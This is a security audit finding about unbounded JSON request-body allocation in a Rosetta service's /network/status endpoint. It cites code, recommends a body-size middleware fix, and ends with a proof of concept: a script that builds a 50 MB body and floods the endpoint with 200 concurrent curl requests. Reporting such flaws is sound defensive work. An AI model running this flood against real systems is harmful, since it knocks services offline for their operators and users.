### Title
Unbounded Request Body Allocation in `/network/status` Enables Memory-Pressure Griefing

### Summary
The `NetworkStatus()` handler in `rosetta/app/services/network_service.go` discards the parsed `*rTypes.NetworkRequest` argument, but the upstream `coinbase/rosetta-sdk-go` framework unconditionally decodes the full HTTP request body into a Go struct before dispatching to the handler. No `http.MaxBytesReader` or equivalent body-size cap exists anywhere in the rosetta middleware chain, so an unauthenticated attacker can POST an arbitrarily large JSON body to `/network/status`, forcing the process to allocate heap memory proportional to the body size for every concurrent request.

### Finding Description

**Exact code path:**

`rosetta/app/services/network_service.go`, lines 59–62 — the handler signature uses `_` for the request parameter, confirming the body is never inspected by application logic:

```go
func (n *networkAPIService) NetworkStatus(
    ctx context.Context,
    _ *rTypes.NetworkRequest,          // body parsed by framework, then discarded
) (*rTypes.NetworkStatusResponse, *rTypes.Error) {
```

`rosetta/main.go`, lines 217–227 — the full middleware chain is assembled and the `http.Server` is configured. No body-size middleware is inserted between `corsMiddleware` and the router, and the `http.Server` struct carries no `MaxBytesReader` equivalent:

```go
metricsMiddleware := middleware.MetricsMiddleware(router)
tracingMiddleware := middleware.TracingMiddleware(metricsMiddleware)
corsMiddleware    := server.CorsMiddleware(tracingMiddleware)
httpServer := &http.Server{
    Addr:              fmt.Sprintf(":%d", rosettaConfig.Port),
    Handler:           corsMiddleware,
    IdleTimeout:       rosettaConfig.Http.IdleTimeout,
    ReadHeaderTimeout: rosettaConfig.Http.ReadHeaderTimeout,
    ReadTimeout:       rosettaConfig.Http.ReadTimeout,
    WriteTimeout:      rosettaConfig.Http.WriteTimeout,
}
```

`rosetta/app/config/types.go`, lines 64–69 — the `Http` config struct has no `MaxBodySize` field:

```go
type Http struct {
    IdleTimeout       time.Duration
    ReadTimeout       time.Duration
    ReadHeaderTimeout time.Duration
    WriteTimeout      time.Duration
}
```

A grep across all rosetta Go sources for `MaxBytesReader`, `LimitReader`, `maxBytes`, or `bodyLimit` returns **zero matches**, confirming no size guard exists anywhere in the stack.

**Root cause:** The `coinbase/rosetta-sdk-go` server calls `json.NewDecoder(r.Body).Decode(&networkRequest)` on the raw `http.Request.Body` before invoking `NetworkStatus`. Because no `http.MaxBytesReader` wraps the body stream, the decoder will read and allocate memory for whatever the client sends, regardless of size.

**Failed assumption:** The developers assumed that because `NetworkStatus` ignores the parsed struct, oversized bodies are harmless. The allocation happens in the framework layer before the handler is reached.

**Exploit flow:**
1. Attacker opens N concurrent TCP connections to port 5700 (default, unauthenticated, no TLS required).
2. Each connection sends `POST /network/status` with a valid JSON envelope whose `metadata` field contains a multi-megabyte or gigabyte-scale value (e.g., a long string or deeply nested object).
3. The rosetta-sdk-go router reads and decodes the full body for each request simultaneously.
4. Go heap grows proportionally; GC pressure spikes; legitimate requests are delayed or OOM-killed.

### Impact Explanation
The process has no per-request memory budget for inbound bodies. Under concurrent load, an attacker can force heap allocations of hundreds of megabytes to gigabytes, degrading or crashing the rosetta service. Because the endpoint is publicly reachable and requires no credentials, the attack surface is the entire internet. Impact is service availability (griefing/DoS); no funds or on-chain state are at risk.

### Likelihood Explanation
The endpoint is unauthenticated, publicly exposed on port 5700, and requires only a valid JSON content-type header. No exploit tooling is needed — a simple `curl` loop or any HTTP load tool suffices. The attack is repeatable and stateless (no session or token required). The only partial mitigation is `ReadTimeout` (default 5 s), which is time-based, not size-based; on a 1 Gbps link an attacker can deliver ~600 MB per connection within the window.

### Recommendation
Wrap `r.Body` with `http.MaxBytesReader` before JSON decoding. The cleanest insertion point is a dedicated middleware applied to all routes:

```go
func MaxBodySizeMiddleware(maxBytes int64) func(http.Handler) http.Handler {
    return func(next http.Handler) http.Handler {
        return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
            r.Body = http.MaxBytesReader(w, r.Body, maxBytes)
            next.ServeHTTP(w, r)
        })
    }
}
```

Insert it in `rosetta/main.go` before `corsMiddleware`, and expose `maxBodySize` (e.g., default 1 MB) as a configurable field in `config.Http`. Additionally, add a `MaxBodySize` field to the `Http` struct in `rosetta/app/config/types.go`.

### Proof of Concept

```bash
# Generate a ~50 MB body (valid JSON with oversized metadata)
python3 -c "
import json, sys
body = json.dumps({'network_identifier': {'blockchain':'Hiero','network':'mainnet'}, 'metadata': {'x': 'A'*50_000_000}})
sys.stdout.write(body)
" > big_body.json

# Fire 200 concurrent requests
seq 200 | xargs -P200 -I{} curl -s -o /dev/null \
  -H 'Content-Type: application/json' \
  --data @big_body.json \
  http://<rosetta-host>:5700/network/status &

# Observe RSS growth on the server
watch -n1 'ps -o pid,rss,vsz -p $(pgrep rosetta)'
```

Expected result: server RSS climbs rapidly proportional to concurrency × body size; legitimate requests experience increased latency or the process is OOM-killed. [1](#0-0) [2](#0-1) [3](#0-2)

### Citations

**File:** rosetta/app/services/network_service.go (L59-62)
```go
func (n *networkAPIService) NetworkStatus(
	ctx context.Context,
	_ *rTypes.NetworkRequest,
) (*rTypes.NetworkStatusResponse, *rTypes.Error) {
```

**File:** rosetta/main.go (L217-227)
```go
	metricsMiddleware := middleware.MetricsMiddleware(router)
	tracingMiddleware := middleware.TracingMiddleware(metricsMiddleware)
	corsMiddleware := server.CorsMiddleware(tracingMiddleware)
	httpServer := &http.Server{
		Addr:              fmt.Sprintf(":%d", rosettaConfig.Port),
		Handler:           corsMiddleware,
		IdleTimeout:       rosettaConfig.Http.IdleTimeout,
		ReadHeaderTimeout: rosettaConfig.Http.ReadHeaderTimeout,
		ReadTimeout:       rosettaConfig.Http.ReadTimeout,
		WriteTimeout:      rosettaConfig.Http.WriteTimeout,
	}
```

**File:** rosetta/app/config/types.go (L64-69)
```go
type Http struct {
	IdleTimeout       time.Duration `yaml:"idleTimeout"`
	ReadTimeout       time.Duration `yaml:"readTimeout"`
	ReadHeaderTimeout time.Duration `yaml:"readHeaderTimeout"`
	WriteTimeout      time.Duration `yaml:"writeTimeout"`
}
```
